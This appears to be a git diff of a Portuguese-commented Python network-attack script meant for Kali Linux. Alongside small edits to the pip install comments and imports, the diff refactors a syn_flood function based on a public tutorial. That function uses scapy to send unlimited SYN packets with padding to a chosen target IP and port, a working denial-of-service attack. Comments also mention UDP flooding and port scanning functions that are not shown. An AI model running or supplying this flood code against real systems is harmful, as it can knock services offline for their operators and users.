@@ -1,7 +1,7 @@
 # Para executar o código abaixo em uma máquina Kali Linux, é necessário em grande parte das vezes instalar as Bibliotecas utilizando os seguintes comandos:
-# sudo pip install scapy
-# sudo pip install pycryptodome
-# sudo pip install cryptography
+# pip install scapy
+# pip install pycryptodome
+# pip install cryptography
  
 
 import os  # Gerar um valor salt aleatório em criptografia
@@ -9,7 +9,6 @@ import socket  # Usado em todas as funções de rede para criar conexões TCP/UD
 import ipaddress  # Gerar e manipular faixas de endereços IP na varredura de portas
 import random  # Gerar números aleatórios, como portas em flood_udp e bytes aleatórios
 import time  # Introduzir atrasos, por exemplo, no port knocking
-import subprocess # Usado para chamar o script externo 
 from scapy.all import *  # Usado na função syn_flood para criação e envio de pacotes de rede personalizados
 from Crypto.Cipher import AES  # Encriptação e decriptação AES nas funções de troca de mensagens
 from Crypto.Util.Padding import pad, unpad  # Adicionar e remover padding em blocos AES
@@ -62,13 +61,12 @@ def flood_udp(ip_alvo):
 
 
 # Baseado no artigo "How to Make a SYN Flooding Attack in Python" / "Abdeladim Fadheli" - https://thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python --->
-def syn_flood(ip_alvo):
-    porta_alvo = int(input("Digite a porta alvo: "))
+def syn_flood(ip_alvo, porta_alvo):
     ip = IP(dst=ip_alvo)
     tcp = TCP(sport=RandShort(), dport=porta_alvo, flags="S")
     raw = Raw(b"X"*1024)
-    p = ip / tcp / raw
-    send(p, loop=1, verbose=0)
+    packet = ip / tcp / raw
+    send(packet, loop=1, verbose=0)
 # Baseado no artigo "How to Make a SYN Flooding Attack in Python" / "Abdeladim Fadheli" - https://thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python <---
  
 
